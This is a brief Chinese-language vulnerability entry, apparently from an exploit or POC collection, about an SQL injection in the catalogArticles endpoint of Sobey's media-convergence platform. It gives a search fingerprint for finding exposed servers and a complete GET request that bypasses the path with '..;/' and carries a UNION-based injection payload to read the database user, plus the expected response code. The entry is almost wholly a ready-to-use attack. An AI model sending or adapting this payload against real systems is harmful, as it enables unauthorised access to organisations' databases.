# 索贝融媒体catalogArticles存在SQL注入漏洞

索贝融媒体 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="689611853"`
- **请求**：`GET /sobey-mchEditor/js/..;/count/catalogArticles?id=(1) UNION ALL SELECT NULL,CONCAT(0x7e,user(),0x7e),NULL,NULL,NULL,NULL-- -)&siteCode=1&token=1 HTTP/1.1`
- **响应特征**：500